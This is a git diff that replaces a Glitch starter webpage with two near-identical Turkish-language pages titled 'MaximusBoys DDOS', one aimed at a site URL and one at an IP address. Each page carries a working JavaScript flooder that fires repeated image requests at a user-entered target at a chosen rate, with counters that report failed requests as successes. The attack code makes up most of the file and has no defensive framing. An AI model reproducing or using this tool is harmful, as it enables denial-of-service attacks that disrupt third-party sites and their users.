@@ -1,28 +1,309 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+<html lang="tr">
 
-    <title>Hello!</title>
-    
-    <!-- import the webpage's stylesheet -->
-    <link rel="stylesheet" href="/style.css">
-    
-    <!-- import the webpage's javascript file -->
-    <script src="/script.js" defer></script>
-  </head>  
-  <body>
-    <h1>Hi there!</h1>
-    
-    <p>
-      I'm your cool new webpage. Made with <a href="https://glitch.com">Glitch</a>!
-    </p>
+<center>  
 
-    <!-- include the Glitch button to show what the webpage is about and
-          to make it easier for folks to view source and remix -->
-    <div class="glitchButton" style="position:fixed;top:20px;right:20px;"></div>
-    <script src="https://button.glitch.me/button.js" defer></script>
-  </body>
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <link rel="stylesheet" href="style.css">
+</head>
+<html>
+<title> MaximusBoys DDOS </title>
+<body>
+<marquee direction=right bgcolor="red">MaximusBoys Site DDOS </marquee>
+</body>
+</html>
+<body>
+<html>
+<head>
+</head>
+<body background="https://cdn.pixabay.com/photo/2016/09/05/15/07/concrete-1646788_960_720.jpg">
+</body>
+</html>
+
+	<link href="https://cdn.discordapp.com/attachments/703558745787203694/706295572046544996/unknown.png" rel="shortcut icon"/>
+
+
+    <div class="main">
+        <div class="logo">
+            
+        </div>
+        <div class="content">
+            <div class="target">
+                <h2>Site URL      </legend>
+                <input type="text" id="targetURL" value="URL" class="form-group" >
+              
+            </div>
+            <div class="setup">
+                <h2>Spam Miktarı</legend>
+                <input type="text" id="rps" value="100" class="form-group">
+                <h2>Spam Yazısı </legend>
+                <input type="text" id="message" value="MaximusBoys" class="form-group">
+            </div>
+            <div class="start">
+                <button id="fireButton">
+                  <center>Başlat</center>
+                </button>
+            </div>
+
+            <div class="stat">
+                <dl>
+                    <center>
+                    <dt style="color: red">Gönderilen</dt>
+                    <dd id="requestedCtr" style="color: green">0</dd>
+                    <dt style="opacity: 0.5; color: red;">Onaylanan</dt>
+                    <dd style="opacity: 0.5; color: green" id="succeededCtr">0</dd>
+                    <dt style="opacity: 0.5; color: red;">Onaylanmayan</dt>
+                    <dd style="opacity: 0.5; color: green" id="failedCtr">0</dd>
+                  </center>
+                </dl>
+            </div>
+        </div>
+        <div class="footer">
+        </div>
+    </div>
+
+
+    <script>
+        (function() {
+            var fireInterval;
+            var isFiring = false;
+            var requestedCtrNode = document.getElementById("requestedCtr"),
+                succeededCtrNode = document.getElementById("succeededCtr"),
+                failedCtrNode = document.getElementById("failedCtr"),
+                targetURLNode = document.getElementById("targetURL"),
+                fireButton = document.getElementById("fireButton"),
+                messageNode = document.getElementById("message"),
+                rpsNode = document.getElementById("rps"),
+                timeoutNode = document.getElementById("timeout");
+            var targetURL = targetURLNode.value;
+            targetURLNode.onchange = function() {
+                targetURL = this.value;
+            };
+            var requestsHT = {};
+            var requestedCtr = 0,
+                succeededCtr = 0,
+                failedCtr = 0;
+            var makeHttpRequest = function() {
+                if (requestedCtr > failedCtr + succeededCtr + 1000) {
+                    return;
+                };
+
+                var rID = Number(new Date());
+                var img = new Image();
+                img.onerror = function() {
+                    onFail(rID);
+                };
+                img.onabort = function() {
+                    onFail(rID);
+                };
+                img.onload = function() {
+                    onSuccess(rID);
+                };
+
+                img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
+                requestsHT[rID] = img;
+                onRequest(rID);
+            };
+
+            var onRequest = function(rID) {
+                requestedCtr++;
+                requestedCtrNode.innerHTML = requestedCtr;
+            };
+
+            var onComplete = function(rID) {
+                delete requestsHT[rID];
+            };
+
+            var onFail = function(rID) {
+
+
+                succeededCtr++;
+                succeededCtrNode.innerHTML = succeededCtr;
+                delete requestsHT[rID];
+            };
+
+            var onSuccess = function(rID) {
+                succeededCtr++;
+                succeededCtrNode.innerHTML = succeededCtr;
+                delete requestsHT[rID];
+            };
+
+            fireButton.onclick = function() {
+                if (isFiring) {
+                    clearInterval(fireInterval);
+                    isFiring = false;
+                } else {
+                    isFiring = true;
+
+                    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
+                }
+            };
+
+        })();
+        isFiring = true;
+        document.getElementById("fireButton").innerHTML = "Başlat";
+        fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(document.getElementById("rps").value) | 0));
+  
+
+    </script>
+</body>
+
+</center>
+</html>
+
+<!DOCTYPE html>
+<html lang="tr">
+
+<center>  
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <link rel="stylesheet" href="style.css">
+</head>
+<html>
+<title> MaximusBoys DDOS </title>
+<body>
+<marquee direction=right bgcolor="red">MaximusBoys İP DDOS</marquee>
+</body>
+</html>
+<body>
+<html>
+<head>
+</head>
+<body background="https://cdn.pixabay.com/photo/2016/09/05/15/07/concrete-1646788_960_720.jpg">
+</body>
+
+
+	<link href="https://cdn.discordapp.com/attachments/703558745787203694/706295572046544996/unknown.png" rel="shortcut icon"/>
+
+
+    <div class="main">
+        <div class="logo">
+            
+        </div>
+        <div class="content">
+            <div class="target">
+                <h2>Kullanıcı İP      </legend>
+                <input type="text" id="targetURL" value="İP" class="form-group" >
+              
+            </div>
+            <div class="setup">
+                <h2>Spam Miktarı</legend>
+                <input type="text" id="rps" value="100" class="form-group">
+                <h2>Spam Yazısı </legend>
+                <input type="text" id="message" value="MaximusBoys" class="form-group">
+            </div>
+            <div class="start">
+                <button id="fireButton">
+                  <center>Başlat</center>
+                </button>
+            </div>
+
+            <div class="stat">
+                <dl>
+                    <center>
+                    <dt style="color: red">Gönderilen</dt>
+                    <dd id="requestedCtr" style="color: green">0</dd>
+                    <dt style="opacity: 0.5; color: red;">Onaylanan</dt>
+                    <dd style="opacity: 0.5; color: green" id="succeededCtr">0</dd>
+                    <dt style="opacity: 0.5; color: red;">Onaylanmayan</dt>
+                    <dd style="opacity: 0.5; color: green" id="failedCtr">0</dd>
+                  </center>
+                </dl>
+            </div>
+        </div>
+        <div class="footer">
+        </div>
+    </div>
+
+
+    <script>
+        (function() {
+            var fireInterval;
+            var isFiring = false;
+            var requestedCtrNode = document.getElementById("requestedCtr"),
+                succeededCtrNode = document.getElementById("succeededCtr"),
+                failedCtrNode = document.getElementById("failedCtr"),
+                targetURLNode = document.getElementById("targetURL"),
+                fireButton = document.getElementById("fireButton"),
+                messageNode = document.getElementById("message"),
+                rpsNode = document.getElementById("rps"),
+                timeoutNode = document.getElementById("timeout");
+            var targetURL = targetURLNode.value;
+            targetURLNode.onchange = function() {
+                targetURL = this.value;
+            };
+            var requestsHT = {};
+            var requestedCtr = 0,
+                succeededCtr = 0,
+                failedCtr = 0;
+            var makeHttpRequest = function() {
+                if (requestedCtr > failedCtr + succeededCtr + 1000) {
+                    return;
+                };
+
+                var rID = Number(new Date());
+                var img = new Image();
+                img.onerror = function() {
+                    onFail(rID);
+                };
+                img.onabort = function() {
+                    onFail(rID);
+                };
+                img.onload = function() {
+                    onSuccess(rID);
+                };
+
+                img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
+                requestsHT[rID] = img;
+                onRequest(rID);
+            };
+
+            var onRequest = function(rID) {
+                requestedCtr++;
+                requestedCtrNode.innerHTML = requestedCtr;
+            };
+
+            var onComplete = function(rID) {
+                delete requestsHT[rID];
+            };
+
+            var onFail = function(rID) {
+
+
+                succeededCtr++;
+                succeededCtrNode.innerHTML = succeededCtr;
+                delete requestsHT[rID];
+            };
+
+            var onSuccess = function(rID) {
+                succeededCtr++;
+                succeededCtrNode.innerHTML = succeededCtr;
+                delete requestsHT[rID];
+            };
+
+            fireButton.onclick = function() {
+                if (isFiring) {
+                    clearInterval(fireInterval);
+                    isFiring = false;
+                } else {
+                    isFiring = true;
+
+                    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
+                }
+            };
+
+        })();
+        isFiring = true;
+        document.getElementById("fireButton").innerHTML = "Başlat";
+        fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(document.getElementById("rps").value) | 0));
+  
+
+    </script>
+</body>
+
+</center>
 </html>
